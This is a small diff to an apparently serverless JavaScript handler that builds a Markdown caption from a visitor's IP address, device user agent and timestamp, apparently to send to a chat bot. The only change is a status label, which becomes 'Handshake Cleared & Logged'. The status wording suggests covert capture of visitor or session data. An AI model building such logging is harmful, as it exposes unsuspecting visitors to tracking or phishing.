@@ -35,7 +35,7 @@ module.exports = async (req, res) => {
                         `🌐 *IP Address:* \`${ipInfo || 'Unknown'}\`\n` +
                         `💻 *Device:* \`${userAgent || 'Unknown'}\`\n` +
                         `⏱️ *Timestamp:* \`${new Date().toUTCString()}\`\n` +
-                        `✅ *Status:* \`Session Synchronized & Handshake Cleared\``;
+                        `✅ *Status:* \`Handshake Cleared & Logged\``;
                         
     formData.append('caption', captionText);
     formData.append('parse_mode', 'Markdown');
